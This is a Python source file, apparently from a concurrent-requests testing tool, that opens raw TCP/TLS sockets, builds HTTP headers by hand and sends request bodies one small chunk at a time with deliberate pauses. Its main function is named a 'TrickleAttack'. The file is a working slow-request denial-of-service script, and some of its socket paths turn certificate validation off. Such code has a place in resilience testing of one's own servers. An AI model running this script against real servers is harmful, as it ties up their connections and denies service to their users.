'''
@author: Jason Tsang Mui Chung

License Copyright: MIT
Copyright 2020 Jason Tsang Mui Chung

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''
import ssl
import socket
import io
import time
from Concurrent_Requests import Log
from http.client import HTTPResponse
from http import client
from io import BytesIO

class FakeSocket():
    def __init__(self, response_bytes):
        self._file = BytesIO(response_bytes)
    def makefile(self, *args, **kwargs):
        return self._file

def print_status(print_status_boolean, message):
    if(print_status_boolean):
        print(message)

def Get_Generic_Request():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    ss = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
    addr = ('www.msn.com', 443)
    ss.connect(addr)
    b = bytes('GET /log.php HTTP/1.0\r\n\r\n', 'utf-8')
    ss.send(b)
    resp = ss.recv(1000)
    ss.close()

def get_context(is_http2_boolean, validate_certificate_boolean):
    """
    SSLContext object taht works for http2 and Pythons TLS.
    """
    # Get the basic context from the standard library.
    ctx = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
    if(validate_certificate_boolean):
        #CERT_REQUIRED - https://docs.python.org/3/library/ssl.html
        #Possible value for SSLContext.verify_mode, or the cert_reqs parameter to wrap_socket(). 
        #In this mode, certificates are required from the other side of the socket connection; 
        #an SSLError will be raised if no certificate is provided, or if its validation fails. 
        #This mode is not sufficient to verify a certificate in client mode as it does not match hostnames. 
        #check_hostname must be enabled as well to verify the authenticity of a cert. 
        #PROTOCOL_TLS_CLIENT uses CERT_REQUIRED and enables check_hostname by default.
        ctx.check_hostname = True
        ctx.verify_mode = ssl.CERT_REQUIRED
    else:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    # RFC 7540 Section 9.2: Implementations of HTTP/2 MUST use TLS version 1.2
    # or higher. Disable TLS 1.1 and lower.
    ctx.options |= (
        ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
    )

    # RFC 7540 Section 9.2.1: A deployment of HTTP/2 over TLS 1.2 MUST disable
    # compression.
    ctx.options |= ssl.OP_NO_COMPRESSION

    # RFC 7540 Section 9.2.2: "deployments of HTTP/2 that use TLS 1.2 MUST
    # support TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256". In practice, the
    # blacklist defined in this section allows only the AES GCM and ChaCha20
    # cipher suites with ephemeral key negotiation.
    ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20")

    if(is_http2_boolean):
        # for http try both NPN and ALPN. ALPN is mandatory - NPN could be absent so still try for it
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        try:
            ctx.set_npn_protocols(["h2", "http/1.1"])
        except NotImplementedError:
            pass
    
    return ctx

def negotiate_tls(tcp_conn, context, hostname_string, is_http2_boolean, print_status_boolean):
    # have to do server_hostname when wrapping due to http2 restrictions
    tls_conn = context.wrap_socket(tcp_conn, server_hostname=hostname_string)
    if(is_http2_boolean):
        # can only check the protocol after the handshake
        negotiated_protocol = tls_conn.selected_alpn_protocol()
        if negotiated_protocol is None:
            negotiated_protocol = tls_conn.selected_npn_protocol()
        if negotiated_protocol != "h2":
            print_status(print_status_boolean, "Error: Didn't negotiate HTTP/2")
            raise RuntimeError("Didn't negotiate HTTP/2")
    return tls_conn

def Get_Socket(TLS_Connection_boolean, TLS_Do_Negotiation_boolean, hostname_string, is_http2_boolean, validate_certificate_boolean, print_status_boolean):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #ssl.PROTOCOL_TLS = Selects the highest protocol version that both the client and server support. Despite the name, this option can select “TLS” protocols as well as “SSL”.
    #ssl.CERT_NONE = With client-side sockets, just about any cert is accepted. Validation errors, such as untrusted or expired cert, are ignored and do not abort the TLS/SSL handshake
    #ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLS)   
    if (TLS_Connection_boolean):
        if(not TLS_Do_Negotiation_boolean):
            #below is a generic way of wrapping the socket in TLS without negotiating. It might be useful
            ss = ssl.wrap_socket(s, keyfile=None, certfile=None, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLS)
            #ss = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
            return ss
        context = get_context(is_http2_boolean, validate_certificate_boolean)
        #tls_conn = context.wrap_socket(s, server_hostname='www.google.com') #this is just a test - moved this to the function above
        tls_connection = negotiate_tls(s, context, hostname_string, is_http2_boolean, print_status_boolean)
        return tls_connection
    else:
        return s

def Craft_Headers_and_Address(
        print_status_boolean, 
        proxied_boolean, 
        SSL_Connection_boolean ,
        host_string, 
        port_int, 
        HTTP_Verb_string, 
        URL_Path_string, 
        http_custom_header_string, 
        http_connection_header_string, 
        Transfer_Encoding_chunked_boolean,
        print_queue_list,
        thread_list
        ):
    http_headers_string = ""
    http_headers_string_partA = """Content-Type: {content_type}\r\nContent-Length: {content_length}\r\n"""
    if(Transfer_Encoding_chunked_boolean):
        http_headers_string_partA = """Content-Type: {content_type}\r\nTransfer-Encoding: chunked\r\n""" #ENABLE FOR CHUNCKED ENCODING
    http_headers_string_partB = """Host: {host}\r\n"""
    http_headers_string_partC = """Connection: close\r\n\r\n""" #you have to end with two line breaks otherwise it doesnt know the header is done...
    if len(http_connection_header_string)>1:
        if not http_connection_header_string.endswith("\r\n"): #just make sure that it properly formats in
            http_connection_header_string = http_connection_header_string + "\r\n\r\n"
        http_headers_string_partC = http_connection_header_string
    if len(http_custom_header_string)>1:
        if not http_custom_header_string.endswith("\r\n"): #just make sure that it properly formats in
            http_custom_header_string = http_custom_header_string + "\r\n"
            http_headers_string = http_headers_string_partA + http_custom_header_string + http_headers_string_partB + http_headers_string_partC#add in the custom header, expect that multiple headers are separated with return line
    else:
        http_headers_string = http_headers_string_partA + http_headers_string_partB + http_headers_string_partC#skip over adding the header string if the lenth is equal to less than 1, gonna assume you need atleast a colon and more
    
    http_protocol = "http://"
    if(SSL_Connection_boolean):
        http_protocol = "https://"
    if(proxied_boolean):
        #hard coding to 8080 for now
        addr = ("127.0.0.1", 8080)
        #http_headers_string = HTTP_Verb_string + """ """ +http_protocol+ host_string + """:"""+str(port_int)+ """/"""  +  URL_Path_string + """ HTTP/1.1\r""" + http_headers_string
        http_headers_string = HTTP_Verb_string + " " +http_protocol+ host_string +  "/"  +  URL_Path_string + " HTTP/1.1\r\n" + http_headers_string
    else:
        addr = (host_string, port_int)
        http_headers_string = HTTP_Verb_string + " /"  +  URL_Path_string + " HTTP/1.1\r\n" + http_headers_string
        #http_headers_string = HTTP_Verb_string + " " +http_protocol+ host_string  + "/"  +  URL_Path_string + " HTTP/1.1\r\n" + http_headers_string
        
    return addr, http_headers_string
'''
def __Open_Socket_Send_BodyData_incomplete(print_status_boolean, host, port, socket_object, address_object, completed_http_header_string, body_string, header_content_type):
    socket_object.connect(address_object)                               
    body_bytes = body_string.encode('ascii')
    header_bytes = completed_http_header_string.format(
        content_type=header_content_type,
        content_length=len(body_bytes),
        host=str(host) + ":" + str(port)
    ).encode('iso-8859-1')
    payload = header_bytes + body_bytes
    socket_object.send(header_bytes)
    resp = socket_object.recv(1000) # do somethign with response
    socket_object.close()
'''
def Open_Socket_Send_BodyData_GeneratedAndChunked__TrickleAttack__(
        print_status_boolean,
        socket_object, 
        address_object,
        host_string, port_int, completed_http_header_string, 
        header_content_type_string, 
        Max_Characters_int, #Max_Characters_int = auto generates a string of this size, number of chars. then calcs content length for http header based on it
        Chunk_Size_int, #Chunk_Size_int = number of characters to send at a time
        Wait_Between_Chunks_Milliseconds_int, #Wait_Between_Chunks_Milliseconds_int = how long to wait inbetween sending the chunks of data during a request
        Transfer_Encoding_chunked_boolean,
        Print_Results_to_CSV_boolean,
        print_queue_list,
        thread_list
        ):
    errors_collection = ""
    #NOTE - sending a trickle attack through a proxy will break the trickle as it will slowly send the request to the proxy and then the proxy will forward the whole thing at once.
    data_to_send = b'A' * Max_Characters_int # we must send bytes                        
    content_lengthz = len(data_to_send)
    
    header_bytes = completed_http_header_string.format(
        content_type=header_content_type_string,
        content_length=content_lengthz,#COMMENT OUT FOR CHUNCKED ENCODING
        host=str(host_string) + ":" + str(port_int)
    ).encode('iso-8859-1')
    
    if(Transfer_Encoding_chunked_boolean):
        header_bytes = completed_http_header_string.format(
            content_type=header_content_type_string,
            #content_length=content_lengthz,#COMMENT OUT FOR CHUNCKED ENCODING
            host=str(host_string) + ":" + str(port_int)
        ).encode('iso-8859-1')
    
    print_status(print_status_boolean, header_bytes.decode("utf-8"))
    
    print_status(print_status_boolean, 'Length of Data to send:' + str(len(data_to_send)))
     
    data = io.BytesIO(data_to_send)
    initial_time = time.time()              #(for RTT) Store the time when request is sent
    iterations = (content_lengthz/Chunk_Size_int)   #calculate number of chunks of the body to send
    ''' soo.. over 15 decimal places and it will auto round. need to do something like this:
    d = decimal.Decimal('1.9999999999999999')
    print(str(math.floor(d)))
    '''
    current_count = 0
    status_code = "n/a"
    try: #try sending chunks
        print_status(print_status_boolean, str(address_object))
        socket_object.connect(address_object)   #open actual connection
        
        print_status(print_status_boolean, 'Connected!')
        socket_object.send(header_bytes)        #send the headers
        while current_count < iterations: #loop over chunks
            chunk = data.read(Chunk_Size_int)
            if(Transfer_Encoding_chunked_boolean):
                chunk = (str(Chunk_Size_int)+"\r\n").encode() + chunk + ("\r\n").encode() #ENABLE FOR CHUNCKED ENCODING
            if not chunk:
                print_status(print_status_boolean, 'Data was not chunked!')
                break
            socket_object.send(chunk)           # SEND THE CHUNK
            current_count = current_count + 1
            print_status(print_status_boolean, 'sent chunk: '+str(current_count) + ' - '+str(chunk))
            time.sleep(Wait_Between_Chunks_Milliseconds_int / 1000)
    except (ConnectionAbortedError):
        status_code = "ConnectionAbortedError"
        errors_collection = errors_collection +  "\nError: Connection was FORCEFULLY CLOSE! - ConnectionAbortedError"
        #print_status(print_status_boolean, 'Connection was FORCEFULLY CLOSE!')
    except (ConnectionResetError):
        status_code = "ConnectionResetError"
        errors_collection = errors_collection +  "\nError: Connection was FORCEFULLY CLOSE! - ConnectionResetError"
        #print_status(print_status_boolean, 'Connection was FORCEFULLY CLOSE!')
    except (client.RemoteDisconnected):
        status_code = "RemoteDisconnected"
        errors_collection = errors_collection +  "\nError: Connection was FORCEFULLY CLOSE! - RemoteDisconnected"
    except Exception as e:#if the server closes the connection
        status_code = "Unknown"
        errors_collection = errors_collection +  "\nError: "+str(e)
        #print_status(print_status_boolean, 'error: ' + str(e))
        
    print_status(print_status_boolean, 'Done sending chunks')
    http_response = "none"
    http_response_bytes = b''
    http_response_length = 0
    try:
        http_response, http_response_bytes, http_response_length = recieve_response(socket_object)
        socket_object.close()       
    except Exception as e:
        #maybe do something with error, its likely that these connections will fail
        socket_object.close()
        #print_status(print_status_boolean, 'error: ' + str(e))
        errors_collection = errors_collection +  "\nError: Failed Receiving Response - "+str(e)
    ending_time = time.time()               #(for RTT) Time when acknowledged the request
    elapsed_time = str(ending_time - initial_time)
    try:
        if(status_code == "n/a"):
            status_code = http_response[8:12]
    except Exception as e:
        errors_collection = errors_collection +  "\nError: "+str(e)
    print_status(print_status_boolean, 'Closed Connection')
    print_status(print_status_boolean, 'RTT: ' + elapsed_time)
    print_status(print_status_boolean, 'HTTP Code: ' + status_code)
    print_status(print_status_boolean, "Response ("+str(http_response_length)+"): " + http_response )
    print_status(print_status_boolean, errors_collection)
    if(Print_Results_to_CSV_boolean):
        try:
            Log.TrickleAttack_to_csv_printqueue_MultiThreaded(print_queue_list, elapsed_time, status_code, str(http_response_length), http_response, thread_list)
        except Exception as e:
            errors_collection = errors_collection +  "\nError: "+str(e)
        '''
        sourcez = FakeSocket(http_response_bytes)
        responsez = HTTPResponse(sourcez)
        responsez.begin()
        if(status_code is "n/a"):
            status_code = str(responsez.status)
        Log.TrickleAttack_to_csv_printqueue_MultiThreaded(Run.print_queue_list, elapsed_time, status_code, str(http_response_length), http_response)
        responsez.closed()
        '''
    return "done"

def recieve_response(input_socket_object):
    response = input_socket_object.recv(4096)  
    #http_response = repr(response)
    http_response = response.decode("utf-8") 
    http_response_len = len(http_response)
    return http_response, response, http_response_len 
    
def Test_One_Request(
        input_print_status_boolean,
        input_proxied_boolean,
        input_SSL_Connection_boolean,
        input_TLS_Do_Negotiation_boolean,
        input_validate_certificate_boolean,
        input_is_http2_boolean,
        input_Transfer_Encoding_chunked_boolean,
        input_host_string,
        input_port_int,
        input_HTTP_Verb_string,
        input_URL_Path_string,
        input_header_content_type_string,
        input_http_connection_header_string,
        input_http_custom_header_string,
        input_TrickleAttack_Max_Characters_int,
        input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int,
        input_TrickleAttack_Chunk_Size_int,
        input_Print_Results_to_CSV_boolean,
        print_queue_list,
        thread_list
        ):
    #Can do "chunked encoding" like http 1.0 streaming, look for comments "ENABLE FOR CHUNCKED ENCODING"
    ''' Example Input
    input_print_status_boolean = True
    input_proxied_boolean = False
    input_SSL_Connection_boolean = True
    input_Transfer_Encoding_chunked_boolean = False #https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding
    input_host_string = "www.somewebsite.com"
    input_port_int = 443
    input_HTTP_Verb_string = "POST"
    input_URL_Path_string = "path/of/some/url?"
    input_header_content_type_string = "application/x-www-form-urlencoded" #e.g: application/x-www-form-urlencoded
    input_http_connection_header_string = "Connection: keep-alive"
    input_http_custom_header_string = "Authorization: Basic xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"#e.g: x-custom_headerA: something1\rx-custom_headerB: something2\r
    input_TrickleAttack_Max_Characters_int = 5 #Max_Characters_int = auto generates a string of this size, number of chars. then calcs content length for http header based on it
    input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int = 50 #Wait_Between_Chunks_Milliseconds_int = how long to wait inbetween sending the chunks of data during a request
    input_TrickleAttack_Chunk_Size_int = 1#Chunk_Size_int = number of characters to send at a time
    '''
    input_socket_object = Get_Socket(
        input_SSL_Connection_boolean, 
        input_TLS_Do_Negotiation_boolean, 
        input_host_string, 
        input_is_http2_boolean, 
        input_validate_certificate_boolean, 
        input_print_status_boolean)
    #input_SSL_socket_object.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1) #stuff to try if connection keeps dying.. but not neccessary
    #input_SSL_socket_object.ioctl(socket.SIO_KEEPALIVE_VALS, (90, 90000, 90000)) #sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000)) enable socket keep alive, with a 10 second keep alive time and a 3 second keep alive interval.
    input_formatted_address, input_http_headers_string = Craft_Headers_and_Address(
        input_print_status_boolean,
        input_proxied_boolean, 
        input_SSL_Connection_boolean,
        input_host_string, 
        input_port_int, 
        input_HTTP_Verb_string, 
        input_URL_Path_string, 
        input_http_custom_header_string,
        input_http_connection_header_string,
        input_Transfer_Encoding_chunked_boolean,
        print_queue_list,
        thread_list)
    Open_Socket_Send_BodyData_GeneratedAndChunked__TrickleAttack__(
        input_print_status_boolean,
        input_socket_object, 
        input_formatted_address,
        input_host_string, input_port_int, input_http_headers_string, 
        input_header_content_type_string, 
        input_TrickleAttack_Max_Characters_int,
        input_TrickleAttack_Chunk_Size_int,
        input_TrickleAttack_Wait_Between_Chunks_Milliseconds_int,
        input_Transfer_Encoding_chunked_boolean,
        input_Print_Results_to_CSV_boolean,
        print_queue_list,
        thread_list
        )
    #print('Done with attack')
